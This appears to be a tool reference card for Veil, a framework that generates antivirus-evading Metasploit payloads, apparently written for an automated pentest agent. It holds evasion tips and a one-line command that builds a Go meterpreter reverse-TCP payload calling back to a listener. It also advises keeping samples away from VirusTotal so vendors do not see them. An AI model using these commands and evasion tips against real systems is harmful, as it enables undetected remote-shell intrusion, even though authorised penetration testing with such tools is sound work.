# veil Toolcard

## Overview
- Summary: Veil is a payload generation framework that creates Metasploit-compatible payloads in multiple languages (Python, Go, C#, PowerShell, Ruby) designed to bypass common AV solutions. Includes Evasion (payload gen) and Ordnance (shellcode gen) modules.

## Advanced Techniques
- Use Go (`go/meterpreter/rev_tcp`) or C# (`cs/meterpreter/rev_tcp`) payloads for lowest AV detection rates; Python/PowerShell are most detected.
- Prefer Py2Exe over PyInstaller for Python payloads (lower detection, requires Windows host with Python 3.3 + Py2Exe).
- Use `--msfvenom` flag to inject custom msfvenom shellcode strings into any Veil template.
- Ordnance module generates custom shellcode with built-in encoders (xor, single_byte_xor) and bad-char avoidance.
- CLI one-liner for non-interactive generation: `veil -t Evasion -p go/meterpreter/rev_tcp --ip 10.10.14.5 --port 443 -o engagement1`
- Key payloads: `python/meterpreter/rev_tcp`, `python/shellcode_inject/flat`, `cs/meterpreter/rev_tcp`, `go/meterpreter/rev_tcp`, `powershell/meterpreter/rev_tcp`.
- Output triple: compiled binary, source code, and Metasploit handler `.rc` file in `/var/lib/veil/output/`.

## Safe Defaults
- Require explicit authorization before generating or deploying payloads (external_exploit=explicit_only).
- Always set up matching handler from generated `.rc` file before deployment.
- Test against local AV only — NEVER upload payloads to VirusTotal (distributes to all vendors).
- Record SHA256 hash of every generated payload before delivery.

## Evidence Outputs
- outputs: evidence.json, findings.json, payload_hashes.txt, generation_log.txt

## References
- https://www.kali.org/tools/veil/
- https://github.com/Veil-Framework/Veil
